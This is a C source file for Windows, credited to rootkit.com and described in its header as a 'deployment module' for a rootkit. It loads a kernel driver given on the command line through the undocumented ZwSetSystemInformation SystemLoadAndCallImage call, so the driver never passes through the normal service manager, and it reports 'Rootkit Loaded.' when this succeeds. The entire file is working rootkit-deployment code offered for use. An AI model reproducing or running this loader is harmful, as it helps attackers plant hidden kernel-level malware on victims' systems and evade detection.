//////////////////////////////////////// 
// New Deployment Module for rootkit 040 
// ------------------------------------- 
// -Greg Hoglund http://www.rootkit.com 
//////////////////////////////////////// 
#include <windows.h> 
#include <stdio.h> 
#include <assert.h>

#define LastErrorToString(errcode, buffer, buffsize) \
                        FormatMessage( FORMAT_MESSAGE_FROM_SYSTEM,\
                        NULL,\
                        errcode,\
                        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),\
                        (LPTSTR) buffer,\
                        buffsize, \
                        NULL );


#define NT_SUCCESS(Status) ((NTSTATUS)(Status) == 0)                



typedef struct _UNICODE_STRING { 
    USHORT Length; 
    USHORT MaximumLength; 
#ifdef MIDL_PASS 
    [size_is(MaximumLength / 2), length_is((Length) / 2) ] USHORT * Buffer; 
#else // MIDL_PASS 
    PWSTR Buffer; 
#endif // MIDL_PASS 
} UNICODE_STRING, *PUNICODE_STRING; 


typedef struct _ANSI_STRING {
  USHORT  Length;
  USHORT  MaximumLength;
  PCHAR  Buffer;
} ANSI_STRING, *PANSI_STRING;




typedef unsigned long NTSTATUS; 



NTSTATUS    (__stdcall *ZwSetSystemInformation)         (IN DWORD SystemInformationClass, 
                                                         IN OUT PVOID SystemInformation, 
                                                         IN ULONG SystemInformationLength); 


VOID        (__stdcall *RtlInitUnicodeString)           (IN OUT PUNICODE_STRING DestinationString, 
                                                         IN PCWSTR SourceString); 


VOID        (__stdcall *RtlInitAnsiString)              (IN OUT PANSI_STRING  DestinationString,
                                                         IN LPCSTR SourceString);


NTSTATUS    (__stdcall *RtlAnsiStringToUnicodeString)   (IN OUT PUNICODE_STRING  DestinationString,
                                                         IN PANSI_STRING  SourceString,
                                                         IN BOOLEAN  AllocateDestinationString);



typedef struct _SYSTEM_LOAD_AND_CALL_IMAGE 
{ 
    UNICODE_STRING ModuleName; 
} SYSTEM_LOAD_AND_CALL_IMAGE, *PSYSTEM_LOAD_AND_CALL_IMAGE; 



#define SystemLoadAndCallImage 38 




int do_help()
{

    printf("The Quick and Dirty SYS loader\nUse: qdsys <file>\nNo UNC paths supported\n");

    return 0;
}


int main(int argc, char *argv[]) 
{ 
/////////////////////////////////////////////////////////////// 
// Why mess with Drivers? 
/////////////////////////////////////////////////////////////// 
SYSTEM_LOAD_AND_CALL_IMAGE GregsImage; 
ANSI_STRING str;
NTSTATUS result;

char fullpathname[1000] = { '\\', '?', '?', '\\', 0 };



    if(argc != 2) return do_help();
    
   // argv1len=strlen(argv[1]);

    result = GetFullPathName(argv[1], sizeof(fullpathname) - 4, fullpathname + 4, NULL);

    if(result == 0)
    {
        LastErrorToString(GetLastError(), fullpathname, sizeof(fullpathname));
        printf("Error obtaining path to file %s: %s", argv[1], fullpathname);
    }
    
    else if((int)result < sizeof(fullpathname))
    {
        
        ////////////////////////////////////////////////////////////// 
        // get DLL entry points 
        ////////////////////////////////////////////////////////////// 
        if( !(RtlInitUnicodeString =(void *) GetProcAddress( GetModuleHandle("ntdll.dll"), "RtlInitUnicodeString" )) ) 
        {
            printf("Could not get address of RtlInitUnicodeString\n");
            exit(1); 
        }

        if( !(RtlInitAnsiString =(void *) GetProcAddress( GetModuleHandle("ntdll.dll"), "RtlInitAnsiString" )) ) 
        {
            printf("Could not get address ofRtlInitAnsiString\n");
            exit(1); 
        }

        if( !(RtlAnsiStringToUnicodeString = (void *) GetProcAddress( GetModuleHandle("ntdll.dll"), "RtlAnsiStringToUnicodeString" )) ) 
        {
            printf("Could not get address RtlAnsiStringToUnicodeString\n");
            exit(1); 
        }
    

        if( !(ZwSetSystemInformation = (void *) GetProcAddress( GetModuleHandle("ntdll.dll"), "ZwSetSystemInformation" )) ) 
        {
            printf("Could not get address ZwSetSystemInformation\n");
            exit(1); 
        }


        RtlInitAnsiString(&str, fullpathname);
    
        //RtlInitUnicodeString( &(GregsImage.ModuleName), daPath ); 

        if(!NT_SUCCESS(RtlAnsiStringToUnicodeString( &(GregsImage.ModuleName), &str, TRUE )))
        {
            printf("No se pudo inicializar cadena UNICODE\n");
            exit(1);
        }

        result=ZwSetSystemInformation(SystemLoadAndCallImage, &GregsImage, sizeof(SYSTEM_LOAD_AND_CALL_IMAGE));

        if(NT_SUCCESS(result)) 
        { 
            printf("Rootkit Loaded.\n"); 
        } 
        else 
        { 
            printf("Rootkit not loaded (NTSTATUS: 0x%08X)\n", result);
        } 
    }

    else
    {
        assert(0); // ESTO NUNCA DEBERIA OCURRIR
    }
    
    
    return 0;

} 


